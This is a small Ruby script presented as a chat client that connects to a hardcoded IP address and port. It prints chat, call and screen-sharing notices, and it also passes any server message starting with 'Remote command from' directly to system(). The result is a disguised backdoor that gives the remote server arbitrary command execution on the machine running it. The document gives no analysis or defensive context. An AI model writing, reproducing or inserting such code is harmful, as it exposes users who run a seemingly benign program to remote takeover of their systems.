require 'socket'

server_ip = '195.35.1.108'
server_port = 3630

client = TCPSocket.new(server_ip, server_port)

puts "Connected to chat server at #{server_ip}:#{server_port}"

Thread.new do
  loop do
    message = client.gets.chomp
    if message.start_with?("Remote command from")
      command = message.split(": ", 2).last
      puts "Executing remote command: #{command}"
      system(command)
    elsif message.include?("Call has been started")
      puts "Call notification: #{message}"
    elsif message.include?("Screen sharing started")
      puts "Screen sharing notification: #{message}"
    else
      puts message
    end
  end
end

loop do
  message = gets.chomp
  client.puts message
end

client.close
